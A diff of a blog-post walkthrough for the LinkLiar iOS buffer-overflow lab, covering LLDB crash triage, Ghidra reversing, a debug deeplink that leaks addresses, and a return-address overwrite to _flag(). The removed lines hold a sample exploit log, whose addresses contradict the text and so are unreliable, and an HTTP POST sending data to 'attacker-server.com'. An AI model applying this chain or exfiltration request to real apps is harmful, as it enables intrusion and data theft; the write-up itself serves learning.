@@ -1,153 +1,224 @@
 ---
 title: "LinkLiar iOS Challenge: Buffer Overflow Deep Dive"
-description: "Walkthrough of solving the LinkLiar buffer overflow challenge using LLDB, Ghidra, and Burp"
+description: "A walkthrough of solving the LinkLiar iOS buffer overflow challenge using LLDB, Ghidra, and Burp Suite."
 pubDate: 2026-03-28
 tags: ["iOS", "reverse-engineering", "buffer-overflow", "lldb", "ghidra", "exploit-development"]
+
 ---
 
-Yoo Folks! Long Time.
+Yo folks, long time.
 
-I was learning iOS reverse engineering lately, and I came across the LinkLiar Challenges. I was working on this challenge for a long time. I was completely lost and frustrated. The challenge itself says it's bufferoverflow still not able to find it. Let me break out to you how I solve this.
+Lately, I've been diving deeper into iOS reverse engineering, and during that journey, I came across the LinkLiar challenge from Mobile Hacking Labs. This one, though? It had me stuck for a while. The challenge description pretty much screamed "buffer overflow," but somehow I just couldn't spot the bug at first. Honestly, it was frustrating the kind of frustration where you're staring at the same code for hours and feel completely lost.
 
-**Tools used:**
+But after banging my head against it long enough, things started to click.
+
+In this post, I'll walk through how I approached the challenge, how I finally tracked down the crash, and how I pieced it all together into a working exploit. Fair warning: this is based on my understanding of the challenge if I got something wrong, feel free to correct me. We're all here to learn.
+
+### Tools Used
+
 - LLDB
 - Ghidra
-- Burp
+- Burpsuite
+- Objection
 
-## Walkthrough of the application
+### Application Overview
 
-Simple app with a scan URL option that scans the URL you provide.
+The app is pretty simple. It has a feature that lets you scan a URL provided by the user.
 
-![App interface](images/linkliar-app.png)
+<span class="img-frame">
 
-And there is a debug Mode which is greyed out.
+![App interface](../../../public/images/linkliar-writeup/linkliar-app.png)
 
-Let's pass URLs http://example.com and http://google.com
+</span>
 
-![Google URL crash](images/google-crash.png)
+<span class="img-frame">
 
-While passing the Google URL APP crashed. That seems interesting.
+![App interface](../../../public/images/linkliar-writeup/linkliar-app2.png)
 
-## Debugging
+</span>
 
-Since a crash occured lets dig into this. LLDB is the right tool to do the same. Lets spinup the server and client
+<span class="img-frame">
 
-![LLDB server](images/lldb-server.png)
-![LLDB client](images/lldb-client.png)
+![App interface](../../../public/images/linkliar-writeup/linkliar-app1.png)
 
-Let's trigger the crash again.
+</span>
 
-![Crash trigger](images/crash-trigger.png)
-![Crash backtrace](images/crash-backtrace.png)
+There is also a **Debug Mode** option, but it appears greyed out initially.
 
-Let's backtrace the crash
-//lldb bt image
+To begin testing, I tried a couple of URLs:
 
+- http://example.com
+- http://google.com
 
-We got a few frames. Let's Look into frame #1: 0x00000001008b6ddc Linkliar`-[ViewController parseHTTPHeaders:] + 380
+<span class="img-frame">
 
-Open the Linkliar binary in Ghidra. Let search parseHTTPHeaders in the symbol Tree.
+![Google URL crash](../../../public/images/linkliar-writeup/crash-trigger.png)
 
-![Ghidra symbol tree](images/ghidra-symbols.png)
+</span>
 
-We got the function lets review it.
+Interestingly, the app crashed when I submitted the Google URL. That immediately made it worth investigating further.
 
-![Ghidra decompilation 1](images/ghidra-decomp1.png)
-![Ghidra decompilation 2](images/ghidra-decomp2.png)
+### Debugging the Crash
+
+Since the app crashed, the next step was to inspect it dynamically. LLDB was the obvious tool for this, so I spun up both the LLDB server and client.
+
+![LLDB server](../../../public/images/linkliar-writeup/lldb-server.png)
+![LLDB client](../../../public/images/linkliar-writeup/lldb-client.png)
+
+After triggering the crash again, I checked the backtrace.
+
+<span class="img-frame">
+
+![Crash trigger](../../../public/images/linkliar-writeup/crash-trigger.png)
+
+</span>
+
+![Crash backtrace](../../../public/images/linkliar-writeup/crash-backtrace.png)
+
+The backtrace showed a few frames, but the interesting one was:
+
+`0x00000001008b6ddc Linkliar\`-[ViewController parseHTTPHeaders:] + 380`
+
+That gave me a clear starting point for static analysis.
+
+### Reversing `parseHTTPHeaders:`
+
+I opened the LinkLiar binary in Ghidra and searched for `parseHTTPHeaders:` in the Symbol Tree.
+
+<span class="img-frame">
+
+![Ghidra symbol tree](../../../public/images/linkliar-writeup/ghidra-symbols.png)
+
+</span>
+
+I found the function and reviewed its decompiled output.
+
+<span class="img-frame">
+
+![Ghidra decompilation 1](../../../public/images/linkliar-writeup/ghidra-decomp1.png)
+![Ghidra decompilation 2](../../../public/images/linkliar-writeup/ghidra-decomp2.png)
+
+</span>
 
 ### Understanding the Overflow
 
-The programmer mistakenly assumed the stack buffers were contiguous when they're actually separate:
-
-Stack Layout (Actual):
-[local_7410: 32 bytes] <- Header 0 name
-[acStack_73e8: 255 bytes] <- Header 0 value
-[local_72e9: 29305 bytes] <- Additional space
-
-Intended Layout (Assumed):
-[Header 0: 296 bytes][Header 1: 296 bytes][Header 2: 296 bytes]
-
-
-**Consequences:**
-
-- **Header 0**: Safely uses `local_7410` and `acStack_73e8`
-- **Header 1**: Writes at offset 296, overwriting `local_72e9`
-- **Header 2+**: Continues overwriting beyond buffer boundaries
-- **Header 100**: Writes beyond `local_72e9` into the stack canary and return address
+The loop manually copies a string without any bounds checking. It will keep writing characters to pcVar13 (which points to local_7410) until it hits a null terminator in the source string. Check out https://0xmohomiester.github.io/posts/Linkliar/ for more clarity on the same.
 
 ### The Flag Function
 
-While analyzing the binary, I discovered a function that constructs a flag that can also be used to exfiltrate the flag:
+Lets look into the flag 
 
-![Flag function](images/flag-function.png)
+<span class="img-frame">
 
-## Finding the Exploitation Vector
+![Flag function](../../../public/images/linkliar-writeup/flag-function.png)
 
-The challenge required calling `_flag()` through the buffer overflow. However, I needed:
+</span>
 
-1. The address of `_flag()` in memory
-2. A way to receive the flag POST request
+That was an important discovery, because the challenge goal was clearly to redirect execution into this function.
+
+### Finding an Exploitation Path
+
+To call `_flag()` through the overflow, I needed two things:
+
+1. The runtime address of `_flag()`
+2. A way to receive the exfiltrated flag request
 
 ### Deep Link Discovery
 
-Examining `Info.plist` revealed custom URL schemes:
+I then checked `Info.plist` and found a custom URL scheme:
 
-```xml
-<key>CFBundleURLTypes</key>
-<array>
-    <dict>
-        <key>CFBundleURLSchemes</key>
-        <array>
-            <string>linkliar</string>
-        </array>
-    </dict>
-</array>
+![Deeplink Scheme](../../../public/images/linkliar-writeup/infoplist.png)
 
-https://images/infoplist.png
+This showed that the app could handle `linkliar://` URLs. That made deep link functionality a likely attack surface, so I continued searching in Ghidra for related strings and handlers.
 
-This indicated the app could handle linkliar:// URLs. Further analysis showed that opening linkliar://debug?url=http://[server] would set the debug URL in NSUserDefaults. This deeplink allowus to enable the debug mode in the application.
+<span class="img-frame">
 
-https://images/debug-mode.png
-https://images/debug-active.png
+![Deeplink Ghidra](../../../public/images/linkliar-writeup/deepGhidra.png)
 
-Crafting the Exploit
-Calculating the Payload Offset
-If you know ASLR, then you know it's not easy to access the function directly by providing the static address from Ghidra. Here, we have a bonus from the deeplink. While accessing the debug deeplink, the application is sending us a debug report over a POST request with a set of runtime addresses.
+</span>
 
-https://images/debug-report.png
+From there, I found references to:
 
-Luckily, the 2nd address is the actual address of the flag function. Now lets develope the payload
+- `scan`
+- `/scan`
+- `debug`
 
-https://images/payload-calc.png
+The `debug` path immediately stood out. Looking at the handler logic, it expected a query parameter as well. That suggested a deep link format like:
 
-Exploit code
+`linkliar://debug?url=http://[server]`
 
-Exploit code explanation
-Store the address received in the post request into an array(debug_addrs[]). Store the 2nd address into flag_addr and convert it to little-endian. Create padding with 32bytes of A. Payload: add the padding + the flag address converted to little-endian. Send the payload in the response.
+When I triggered it, I found that the app stored the supplied URL in `NSUserDefaults` as the debug endpoint. In other words, this deep link enabled the previously greyed-out debug mode.
 
-The Exploit Chain
+<span class="img-frame">
 
-Start exploit server —> open deeplink in iPhone—> Scan the exploit URL(Exploit Delivery) —> Flag Exfiltration.
+![Debug Activation](../../../public/images/linkliar-writeup/debug-active.png)
+![Debug Mode](../../../public/images/linkliar-writeup/debug-mode.png)
 
-text
-[+] Exploit server running on port 8080
-[+] External IP: Use your local IP address
-[+] Step 1: Open linkliar://debug?url=http://[YOUR_IP]:8080
-[+] Step 2: Scan URL http://[YOUR_IP]:8080/exploit
-[+] Debug report received. Addresses: [0x1008b6ddc, 0x1008b6ddc]
-[+] Sending exploit payload with flag address: 0x1008b6ddc
-[+] Exploit payload delivered to 192.168.1.100:54321
-Flag Exfiltration
-After the exploit chain completes, the flag is sent back to the server:
+</span>
 
-json
-POST /flag HTTP/1.1
-Host: attacker-server.com
-Content-Type: application/json
+![Objection](../../../public/images/linkliar-writeup/objection.png)
 
-{
-    "flag": "LINKLIAR{1f_y0u_kn0w_y0u_kn0w_1f_y0u_d0n7_y0u_d0n7}",
-    "timestamp": "2026-03-28T12:34:56Z"
-}
+### Turning Debug Mode Into an Info Leak
 
-Happy hacking! 🚀
+This debug feature turned out to be extremely useful.
+
+When the debug deeplink was activated, the app sent a debug report to the attacker controlled server over a POST request. That report included runtime addresses.
+
+<span class="img-frame">
+
+![Debug Report](../../../public/images/linkliar-writeup/debug-report.png)
+
+</span>
+
+This solved the ASLR problem for me. Instead of relying on the static address seen in Ghidra, I could use the leaked runtime address from the debug report.
+
+Conveniently, the second leaked address corresponded to the real address of the flag function in memory.
+
+### Crafting the Exploit
+
+Once I had the runtime address of `_flag()`, the remaining task was building a payload that overwrote control data and redirected execution.
+
+
+![Payload calculation](../../../public/images/linkliar-writeup/payload-calc.png)
+
+The exploit logic was straightforward:
+
+- Receive the debug report and store the leaked addresses in an array such as `debug_addrs[]`.
+- Extract the second entry as `flag_addr`.
+- Convert `flag_addr` into little-endian format.
+- Create padding of 32 bytes using `A`.
+- Build the final payload as: padding + little-endian `flag_addr`.
+- Return the payload in the malicious HTTP response.
+
+### Exploit Chain
+
+The full chain looked like this:
+
+1. Start the exploit server.
+2. Open the debug deep link on the iPhone: `linkliar://debug?url=http://[YOUR_IP]:8080`
+3. In the app, scan the malicious URL: `http://[YOUR_IP]:8080/`
+4. The app sends a debug report containing runtime addresses.
+5. The server extracts the leaked `_flag()` address.
+6. The crafted payload is delivered.
+7. Control flow is redirected to `_flag()`.
+8. The flag is exfiltrated back to the attacker-controlled server.
+
+
+### Flag Exfiltration
+
+After the exploit completes, the app sends the flag back to the server in a POST request:
+
+<video controls width="100%">
+  <source src="../../../public/images/linkliar-writeup/poc.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+
+That completes the challenge.
+
+I really enjoyed this one because it combined multiple pieces instead of being just a simple crash-to-win task. The buffer overflow alone was not enough the interesting part was chaining it with the deeplink functionality and the address leak to bypass ASLR and reach the flag function reliably.
+
+Reference:
+1. https://www.inversecos.com/2022/06/how-to-reverse-engineer-and-patch-ios.html
+2. https://0xmohomiester.github.io/posts/Linkliar/
+
+Happy hacking. 🚀
